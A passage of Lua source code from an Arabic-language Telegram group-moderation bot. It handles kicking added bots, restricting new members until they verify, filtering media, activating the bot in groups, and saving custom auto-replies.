tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_}) 
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,dp) local admins = dp.members_ for i=0 , #admins do if dp.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not VipMem(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end     
end
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and Bots == "del" and not VipMem(msg) then   
GetInfo = https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local JsonInfo = JSON.decode(GetInfo)
if JsonInfo.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_}) 
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,dp) local admins = dp.members_ for i=0 , #admins do if dp.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not VipMem(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end     
end
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and Bots == "ked" and not VipMem(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_.."&can_send_messages=false&can_send_media_messages=false&can_send_other_messages=false&can_add_web_page_previews=false")
DevHmD:sadd(DevTwix..'HmD:Tkeed:'..msg.chat_id_, msg.sender_user_id_)
GetInfo = https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local JsonInfo = JSON.decode(GetInfo)
if JsonInfo.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_}) 
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,dp) local admins = dp.members_ for i=0 , #admins do if dp.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not VipMem(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end  
end  
end
if msg.content_.ID == "MessageChatDeleteMember" and tonumber(msg.content_.user_.id_) == tonumber(DevTwix) then 
DevHmD:srem(DevTwix.."HmD:Groups", msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
if not Sudo(msg) and not Bot(msg) then
SendText(DevId,"⋄︙*تم طرد البوت من المجموعه » *\n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n⋄︙بواسطة » "..Name.."\n⋄︙اسم المجموعه » ["..NameChat.."]\n⋄︙ايدي المجموعه »  \n( `"..msg.chat_id_.."` )\n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n⋄︙الوقت* » "..os.date("%I:%M%p").."*\n⋄︙التاريخ *» "..os.date("%Y/%m/%d").."*",0,'md')
end
end,nil)
end,nil)
end
if msg.content_.ID == "MessageChatDeletePhoto" or msg.content_.ID == "MessageChatChangePhoto" or msg.content_.ID == 'MessagePinMessage' or msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" or msg.content_.ID == 'MessageChatChangeTitle' or msg.content_.ID == "MessageChatDeleteMember" then   
if DevHmD:get(DevTwix..'HmD:Lock:TagServr'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})    
end   
end
if msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" then   
DevHmD:incr(DevTwix..'HmD:EntryNumber'..msg.chat_id_..':'..os.date('%d'))  
elseif msg.content_.ID == "MessageChatDeleteMember" then   
DevHmD:incr(DevTwix..'HmD:ExitNumber'..msg.chat_id_..':'..os.date('%d'))  
end
---------------------------------------------------------------------------------------
if text ==('تفعيل') and not SudoBot(msg) and ChCheck(msg) then
if not DevHmD:get(DevTwix..'HmD:Lock:FreeBot'..DevTwix) then
if ChatType == 'pv' then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙لاتستطيع تفعيلي هنا يرجى اضافتي في مجموعه اولا', 1, 'md')
return false
end
if ChatType ~= 'sp' then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙المجموعه عاديه وليست خارقه لا تستطيع تفعيلي يرجى ان تضع سجل رسائل المجموعه ضاهر وليس مخفي ومن بعدها يمكنك رفعي ادمن ثم تفعيلي', 1, 'md')
return false
end
if msg.can_be_deleted_ == false then 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙البوت ليس ادمن يرجى ترقيتي !', 1, 'md')
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = msg.chat_id_:gsub("-100","")}, function(arg,data)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,ChatMem) 
if ChatMem and ChatMem.status_.ID == "ChatMemberStatusEditor" or ChatMem and ChatMem.status_.ID == "ChatMemberStatusCreator" then
if ChatMem and ChatMem.user_id_ == msg.sender_user_id_ then
if ChatMem.status_.ID == "ChatMemberStatusCreator" then
status = 'منشئ'
elseif ChatMem.status_.ID == "ChatMemberStatusEditor" then
status = 'ادمن'
else 
status = 'عضو'
end
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,HmD) 
local admins = HmD.members_
for i=0 , #admins do
if HmD.members_[i].bot_info_ == false and HmD.members_[i].status_.ID == "ChatMemberStatusEditor" then
DevHmD:sadd(DevTwix..'HmD:Admins:'..msg.chat_id_, admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevHmD:srem(DevTwix..'HmD:Admins:'..msg.chat_id_, admins[i].user_id_)
end
end,nil)   
else
DevHmD:sadd(DevTwix..'HmD:Admins:'..msg.chat_id_, admins[i].user_id_)
end
if HmD.members_[i].status_.ID == "ChatMemberStatusCreator" then
DevHmD:sadd(DevTwix.."HmD:HMDicConstructor:"..msg.chat_id_,admins[i].user_id_)
DevHmD:sadd(DevTwix.."HmD:HmDConstructor:"..msg.chat_id_,admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevHmD:srem(DevTwix.."HmD:HMDicConstructor:"..msg.chat_id_,admins[i].user_id_)
DevHmD:srem(DevTwix.."HmD:HmDConstructor:"..msg.chat_id_,admins[i].user_id_)
end
end,nil)  
end 
end
end,nil)
if DevHmD:sismember(DevTwix..'HmD:Groups',msg.chat_id_) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙المجموعه بالتاكيد مفعله', 1, 'md')
else
if tonumber(data.member_count_) < tonumber(DevHmD:get(DevTwix..'HmD:Num:Add:Bot') or 0) and not SecondSudo(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙عدد اعضاء المجموعه اقل من » *'..(DevHmD:get(DevTwix..'HmD:Num:Add:Bot') or 0)..'* عضو', 1, 'md')
return false
end
local Text = "⋄︙*اسم المجموعة :* "..dp.title_.."\n\n⋄︙*اضغط ادنا لتفعيل البوت فيها*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• تفعيل •",callback_data="/AddHelpList:"..msg.sender_user_id_}}}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
DevHmD:sadd(DevTwix.."HmD:Groups",msg.chat_id_)
DevHmD:sadd(DevTwix..'HmD:HMDicConstructor:'..msg.chat_id_,msg.sender_user_id_)
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NumMem = data.member_count_
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
else
LinkGroup = 'لا يوجد'
end
DevHmD:set(DevTwix.."HmD:Groups:Links"..msg.chat_id_,LinkGroup) 
SendText(DevId,"⋄︙*تم تفعيل مجموعه جديده »*  \n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n⋄︙بواسطة » "..Name.."\n⋄︙موقعه في المجموعه » *"..status.."*\n⋄︙اسم المجموعه » ["..NameChat.."]\n⋄︙عدد اعضاء المجموعه » ( *"..NumMem.."* )\n⋄︙ايدي المجموعه »  \n( `"..msg.chat_id_.."` )\n⋄︙رابط المجموعه » \n❨ ["..LinkGroup.."] ❩\n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n⋄︙الوقت *» "..os.date("%I:%M%p").."*\n⋄︙التاريخ *» "..os.date("%Y/%m/%d").."*",0,'md')
end
end end
end,nil)
end,nil)
end,nil)
end,nil)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙لا تستطيع تفعيل هذه المجموعه بسبب تعطيل البوت الخدمي من قبل المطور الاساسي', 1, 'md') 
end 
end 
---------------------------------------------------------------------------------------
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
DevHmD:set(DevTwix..'Save:UserName'..msg.sender_user_id_,data.username_)
end;end,nil) 
---------------------------------------------------------------------------------------
local ReFalse = tostring(msg.chat_id_)
if not DevHmD:sismember(DevTwix.."HmD:Groups",msg.chat_id_) and not ReFalse:match("^(%d+)") and not SudoBot(msg) then
print("Return False : The Bot Is Not Enabled In The Group")
return false
end
---------------------------------------------------------------------------------------
-------- MSG TYPES ---------
if msg.content_.ID == "MessageChatJoinByLink" and not VipMem(msg) then 
if DevHmD:get(DevTwix..'HmD:Lock:Robot'..msg.chat_id_) then
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,dp) 
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..dp.id_)
DevHmD:sadd(DevTwix..'HmD:Tkeed:'..msg.chat_id_, dp.id_)
local Text = '⋄︙أهلآ عـزيزي » ['..string.sub(dp.first_name_,0, 40)..'](tg://user?id='..dp.id_..')\n⋄︙يجب علينا التأكد أنك لست روبوت\n⋄︙تم تقيدك اضغط الزر بالاسفل لفكه'
keyboard = {} 
keyboard.inline_keyboard = {{{text="اضغط هنا لفك تقيدك",callback_data="/UnTkeed"}}} 
Msg_id = msg.id_/2097152/0.5
HTTPS.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text='..URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)
return false
end
if DevHmD:get(DevTwix.."HmD:Lock:Join"..msg.chat_id_) then
ChatKick(msg.chat_id_,msg.sender_user_id_) 
return false  
end
end
if msg.content_.ID == "MessagePhoto" then
if not Bot(msg) then 
local filter = DevHmD:smembers(DevTwix.."HmD:FilterPhoto"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.photo_.id_ then
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","⋄︙الصوره التي ارسلتها تم منعها من المجموعه")  
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false   
end
end
end
end
if msg.content_.ID == "MessageAnimation" then
if not Bot(msg) then 
local filter = DevHmD:smembers(DevTwix.."HmD:FilterAnimation"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.animation_.animation_.persistent_id_ then
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","⋄︙المتحركه التي ارسلتها تم منعها من المجموعه")  
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
end
end
end
end
if msg.content_.ID == "MessageSticker" then
if not Bot(msg) then 
local filter = DevHmD:smembers(DevTwix.."HmD:FilterSteckr"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.sticker_.sticker_.persistent_id_ then
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","⋄︙الملصق الذي ارسلته تم منعه من المجموعه")  
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false   
end
end
end
end
---------------------------------------------------------------------------------------
if text and text:match("^(.*)$") then
local DelGpRedRedods = DevHmD:get(DevTwix..'HmD:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
local GetGpTexts = DevHmD:get(DevTwix..'HmD:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
if DelGpRedRedods == 'DelGpRedRedods' then
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙الرد » '..msg.content_.text_..' للكلمه » '..GetGpTexts..' تم حذفها',  1, "html")
DevHmD:del(DevTwix..'HmD:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
DevHmD:srem(DevTwix..'HmD:Text:GpTexts'..GetGpTexts..msg.chat_id_,msg.content_.text_)
return false
end
end
if text and text:match("^(.*)$") then
local DelGpRed = DevHmD:get(DevTwix..'HmD:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
if DelGpRed == 'DelGpRedod' then
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙الكلمه ( '..msg.content_.text_..' ) تم حذفها',  1, "html")
DevHmD:del(DevTwix..'HmD:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
DevHmD:del(DevTwix..'HmD:Text:GpTexts'..msg.content_.text_..msg.chat_id_)
DevHmD:srem(DevTwix..'HmD:Manager:GpRedod'..msg.chat_id_,msg.content_.text_)
return false
end
end
if text and text:match("^(.*)$") then
local DelGpRed = DevHmD:get(DevTwix..'HmD:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
if DelGpRed == 'DelGpRed' then
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙الكلمه ( '..msg.content_.text_..' ) تم حذفها',  1, "html")
DevHmD:del(DevTwix..'HmD:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
DevHmD:del(DevTwix..'HmD:Gif:GpRed'..msg.content_.text_..msg.chat_id_)
DevHmD:del(DevTwix..'HmD:Voice:GpRed'..msg.content_.text_..msg.chat_id_)
DevHmD:del(DevTwix..'HmD:Audio:GpRed'..msg.content_.text_..msg.chat_id_)
DevHmD:del(DevTwix..'HmD:Photo:GpRed'..msg.content_.text_..msg.chat_id_)
DevHmD:del(DevTwix..'HmD:Stecker:GpRed'..msg.content_.text_..msg.chat_id_)
DevHmD:del(DevTwix..'HmD:Video:GpRed'..msg.content_.text_..msg.chat_id_)
DevHmD:del(DevTwix..'HmD:File:GpRed'..msg.content_.text_..msg.chat_id_)
DevHmD:del(DevTwix..'HmD:Text:GpRed'..msg.content_.text_..msg.chat_id_)
DevHmD:srem(DevTwix..'HmD:Manager:GpRed'..msg.chat_id_,msg.content_.text_)
return false
end
end
if text and text:match("^(.*)$") then
local DelAllRed = DevHmD:get(DevTwix.."HmD:Add:AllRed"..msg.sender_user_id_)
if DelAllRed == 'DelAllRed' then
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙الكلمه ( '..msg.content_.text_..' ) تم حذفها',  1, "html")
DevHmD:del(DevTwix.."HmD:Add:AllRed"..msg.sender_user_id_)
DevHmD:del(DevTwix.."HmD:Gif:AllRed"..msg.content_.text_)
DevHmD:del(DevTwix.."HmD:Voice:AllRed"..msg.content_.text_)
DevHmD:del(DevTwix.."HmD:Audio:AllRed"..msg.content_.text_)
DevHmD:del(DevTwix.."HmD:Photo:AllRed"..msg.content_.text_)
DevHmD:del(DevTwix.."HmD:Stecker:AllRed"..msg.content_.text_)
DevHmD:del(DevTwix.."HmD:Video:AllRed"..msg.content_.text_)
DevHmD:del(DevTwix.."HmD:File:AllRed"..msg.content_.text_)
DevHmD:del(DevTwix.."HmD:Text:AllRed"..msg.content_.text_)
DevHmD:del(DevTwix.."HmD:Sudo:AllRed",msg.content_.text_)
return false
end
end
---------------------------------------------------------------------------------------
if text and text:match("^(.*)$") then
local SaveGpRedod = DevHmD:get(DevTwix..'HmD:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
if SaveGpRedod == 'SaveGpRedod' then
local GetGpTexts = DevHmD:get(DevTwix..'HmD:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
local List = DevHmD:smembers(DevTwix..'HmD:Text:GpTexts'..GetGpTexts..msg.chat_id_)
if text == "الغاء" then 
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙⋄︙تم الغاء عملية حفظ الردود المتعدده للامر » "..GetGpTexts ,  1, "md")
DevHmD:del(DevTwix..'HmD:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
DevHmD:del(DevTwix..'HmD:Text:GpTexts'..GetGpTexts..msg.chat_id_)
DevHmD:del(DevTwix..'HmD:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
DevHmD:srem(DevTwix..'HmD:Manager:GpRedod'..msg.chat_id_,GetGpTexts)
return false
end
Text = text:gsub('"',""):gsub('"',""):gsub("`",""):gsub("*","")
DevHmD:sadd(DevTwix..'HmD:Text:GpTexts'..GetGpTexts..msg.chat_id_,Text)
if #List == 4 then 
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙تم حفظ » 5 من الردود المتعدده للامر » "..GetGpTexts ,  1, "md")
DevHmD:del(DevTwix..'HmD:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
return false
end
local HmD = "⋄︙تم حفظ الرد رقم » "..(#List+1).."\n⋄︙قم بارسال الرد رقم » "..(#List+2)
keyboard = {} 
keyboard.inline_keyboard = {{{text="انهاء وحفظ "..(#List+1).." من الردود",callback_data="/EndRedod:"..msg.sender_user_id_..GetGpTexts}},{{text="الغاء وحذف التخزين",callback_data="/DelRedod:"..msg.sender_user_id_..GetGpTexts}}} 
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(HmD).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
end
if text and not DevHmD:get(DevTwix..'HmD:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_) then
if DevHmD:sismember(DevTwix..'HmD:Manager:GpRedod'..msg.chat_id_,text) then
local DevTwixTeam =  DevHmD:smembers(DevTwix..'HmD:Text:GpTexts'..text..msg.chat_id_)
Dev_HmD(msg.chat_id_, msg.id_, 1, '['..DevTwixTeam[math.random(#DevTwixTeam)]..']' , 1, 'md')  
end
end
---------------------------------------------------------------------------------------
if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then 
local SaveGpRed = DevHmD:get(DevTwix..'HmD:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
if SaveGpRed == 'SaveGpRed' then 
if text == 'الغاء' then
local DelManagerRep = DevHmD:get(DevTwix..'DelManagerRep'..msg.chat_id_)
DevHmD:srem(DevTwix..'HmD:Manager:GpRed'..msg.chat_id_,DelManagerRep)
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم الغاء حفظ الرد', 1, 'md')
DevHmD:del(DevTwix..'HmD:Add:GpText'..msg.sender_user_id_..msg.chat_id_)
DevHmD:del(DevTwix..'HmD:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
DevHmD:del(DevTwix..'DelManagerRep'..msg.chat_id_)
return false
end
DevHmD:del(DevTwix..'HmD:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
local SaveGpRed = DevHmD:get(DevTwix..'HmD:Add:GpText'..msg.sender_user_id_..msg.chat_id_)
if msg.content_.video_ then DevHmD:set(DevTwix..'HmD:Video:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.video_.video_.persistent_id_)
end
if msg.content_.document_ then DevHmD:set(DevTwix..'HmD:File:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.document_.document_.persistent_id_)
end
if msg.content_.sticker_ then DevHmD:set(DevTwix..'HmD:Stecker:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.sticker_.sticker_.persistent_id_) 
end 
if msg.content_.voice_ then DevHmD:set(DevTwix..'HmD:Voice:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.voice_.voice_.persistent_id_) 
end
if msg.content_.audio_ then DevHmD:set(DevTwix..'HmD:Audio:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.audio_.audio_.persistent_id_) 
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_group = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_group = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_group = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_group = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
DevHmD:set(DevTwix..'HmD:Photo:GpRed'..SaveGpRed..msg.chat_id_, photo_in_group) 
end
if msg.content_.animation_ then DevHmD:set(DevTwix..'HmD:Gif:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.animation_.animation_.persistent_id_) 
end 
if msg.content_.text_ then
DevHmD:set(DevTwix..'HmD:Text:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.text_)
end 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم حفظ الرد الجديد', 1, 'md') 
DevHmD:del(DevTwix..'HmD:Add:GpText'..msg.sender_user_id_..msg.chat_id_)
DevHmD:del(DevTwix..'DelManagerRep'..msg.chat_id_)
return false 
end 
end
if msg.content_.text_ and not DevHmD:get(DevTwix..'HmD:Lock:GpRed'..msg.chat_id_) then 
if DevHmD:get(DevTwix..'HmD:Video:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevHmD:get(DevTwix..'HmD:Video:GpRed'..msg.content_.text_..msg.chat_id_)) 
end 
if DevHmD:get(DevTwix..'HmD:File:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, DevHmD:get(DevTwix..'HmD:File:GpRed'..msg.content_.text_..msg.chat_id_)) 
end 
if DevHmD:get(DevTwix..'HmD:Voice:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevHmD:get(DevTwix..'HmD:Voice:GpRed'..msg.content_.text_..msg.chat_id_)) 
end
if DevHmD:get(DevTwix..'HmD:Audio:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, DevHmD:get(DevTwix..'HmD:Audio:GpRed'..msg.content_.text_..msg.chat_id_)) 
end
if DevHmD:get(DevTwix..'HmD:Photo:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, DevHmD:get(DevTwix..'HmD:Photo:GpRed'..msg.content_.text_..msg.chat_id_)) 
end
if DevHmD:get(DevTwix..'HmD:Gif:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevHmD:get(DevTwix..'HmD:Gif:GpRed'..msg.content_.text_..msg.chat_id_)) 
end 
if DevHmD:get(DevTwix..'HmD:Stecker:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevHmD:get(DevTwix..'HmD:Stecker:GpRed'..msg.content_.text_..msg.chat_id_))
end
if DevHmD:get(DevTwix..'HmD:Text:GpRed'..msg.content_.text_..msg.chat_id_) then
function DevTwixTeam(extra,result,success)
if result.username_ then username = '[@'..result.username_..']' else username = 'لا يوجد' end
local edit_msg = DevHmD:get(DevTwix..'HmD:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevHmD:get(DevTwix..'HmD:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = DevHmD:get(DevTwix..'HmD:Text:GpRed'..msg.content_.text_..msg.chat_id_)
local Text = Text:gsub('#username',(username or 'لا يوجد')) 
local Text = Text:gsub('#name','['..result.first_name_..']')
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',edit_msg)
local Text = Text:gsub('#msgs',(user_msgs or 'لا يوجد'))
local Text = Text:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
send(msg.chat_id_,msg.id_,Text)
end
getUser(msg.sender_user_id_, DevTwixTeam)
end
end
---------------------------------------------------------------------------------------
text = msg.content_.text_
if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then
local SaveAllRed = DevHmD:get(DevTwix.."HmD:Add:AllRed"..msg.sender_user_id_)
if SaveAllRed == 'SaveAllRed' then
if text == 'الغاء' then
local DelSudoRep = DevHmD:get(DevTwix..'DelSudoRep')
DevHmD:del(DevTwix.."HmD:Sudo:AllRed",DelSudoRep)
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم الغاء حفظ الرد', 1, 'md')
DevHmD:del(DevTwix.."HmD:Add:AllText"..msg.sender_user_id_)
DevHmD:del(DevTwix.."HmD:Add:AllRed"..msg.sender_user_id_)
DevHmD:del(DevTwix.."DelSudoRep")
return false
end
DevHmD:del(DevTwix.."HmD:Add:AllRed"..msg.sender_user_id_)
local SaveAllRed = DevHmD:get(DevTwix.."HmD:Add:AllText"..msg.sender_user_id_)
if msg.content_.video_ then
DevHmD:set(DevTwix.."HmD:Video:AllRed"..SaveAllRed, msg.content_.video_.video_.persistent_id_)
end
if msg.content_.document_ then
DevHmD:set(DevTwix.."HmD:File:AllRed"..SaveAllRed, msg.content_.document_.document_.persistent_id_)
end
